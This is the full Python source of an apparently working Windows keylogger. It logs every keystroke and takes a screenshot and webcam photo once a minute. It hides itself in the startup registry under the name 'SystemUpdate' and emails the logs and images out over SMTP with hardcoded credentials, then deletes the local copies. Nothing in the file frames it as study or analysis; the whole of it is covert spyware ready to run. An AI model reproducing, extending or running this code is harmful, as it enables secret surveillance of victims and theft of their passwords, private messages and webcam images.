import os
os.environ["NUMPY_EXPERIMENTAL_ARRAY_FUNCTION"] = "0"

import os
import sys
import threading
import traceback
import smtplib
import pyautogui
import cv2
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
import winreg

# === CONFIG ===
LOG_FILE = os.path.join(os.getenv('APPDATA'), 'keylog.txt')
SCREENSHOT_DIR = os.path.join(os.getenv('USERPROFILE'), 'Downloads', 'scrnshots')
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

EMAIL_ADDRESS = 'log@yourdomain.com'
SMTP_HOST = 'sandbox.smtp.mailtrap.io'
SMTP_PORT = 587
SMTP_USER = '36c6dc4d1bd376'
SMTP_PASS = '930572493ba13f'

SEND_INTERVAL = 60  # seconds

DEBUG_LOG_FILE = os.path.join(os.getenv('APPDATA'), 'debug_log.txt')

# === DEBUG LOGGER ===
def log_debug(message):
    try:
        with open(DEBUG_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] {message}\n")
    except:
        pass

# === STARTUP PERSISTENCE ===
def add_to_startup():
    try:
        exe_path = os.path.realpath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
        log_debug("Added to startup.")
    except Exception:
        log_debug("Startup persistence error:\n" + traceback.format_exc())

# === KEYLOGGER ===
def on_press(key):
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now().strftime('%H:%M:%S')} - {repr(key.char)}\n")
    except AttributeError:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now().strftime('%H:%M:%S')} - [{key}]\n")

# === SCREENSHOT ===
def take_screenshot():
    try:
        filename = f'screen_{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.png'
        filepath = os.path.join(SCREENSHOT_DIR, filename)
        screenshot = pyautogui.screenshot()
        screenshot.save(filepath)
        log_debug(f"Screenshot saved: {filepath}")
    except Exception:
        log_debug("Screenshot failed:\n" + traceback.format_exc())

# === WEBCAM CAPTURE ===
def capture_webcam_image():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            filename = f'webcam_{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.png'
            filepath = os.path.join(SCREENSHOT_DIR, filename)
            cv2.imwrite(filepath, frame)
            log_debug(f"Webcam image saved: {filepath}")
        cam.release()
        cv2.destroyAllWindows()
    except Exception:
        log_debug("Webcam capture failed:\n" + traceback.format_exc())

# === LOOPING TASKS ===
def screenshot_loop():
    take_screenshot()
    capture_webcam_image()
    threading.Timer(SEND_INTERVAL, screenshot_loop).start()

# === SEND EMAIL ===
def send_logs():
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r', encoding='utf-8') as file:
                content = file.read()

            if content.strip():
                msg = MIMEMultipart()
                msg['Subject'] = 'Keylogger Report'
                msg['From'] = EMAIL_ADDRESS
                msg['To'] = EMAIL_ADDRESS

                msg.attach(MIMEText("Attached are the latest keystrokes and images.", "plain"))
                msg.attach(MIMEText(content, 'plain'))

                # Attach all image files (screenshots + webcam)
                images = sorted(os.listdir(SCREENSHOT_DIR))
                for img_file in images:
                    img_path = os.path.join(SCREENSHOT_DIR, img_file)
                    with open(img_path, 'rb') as f:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f'attachment; filename={img_file}')
                        msg.attach(part)
                        log_debug(f"Attached image: {img_file}")

                server = smtplib.SMTP(SMTP_HOST, SMTP_PORT)
                server.starttls()
                server.login(SMTP_USER, SMTP_PASS)
                server.send_message(msg)
                server.quit()
                log_debug("[+] Email sent successfully.")

                # Clear logs and screenshots after sending
                with open(LOG_FILE, 'w', encoding='utf-8') as file:
                    file.write('')
                for img in images:
                    os.remove(os.path.join(SCREENSHOT_DIR, img))
                log_debug("Cleared keylog and screenshots after sending.")
            else:
                log_debug("Log file empty — nothing to send.")
    except Exception:
        log_debug("Email send failed:\n" + traceback.format_exc())

    threading.Timer(SEND_INTERVAL, send_logs).start()

# === MAIN ===
def main():
    log_debug("=== Keylogger started ===")
    add_to_startup()

    # Start periodic screenshot + webcam + email sending
    screenshot_loop()
    send_logs()

    # Start keylogger listener (blocking)
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
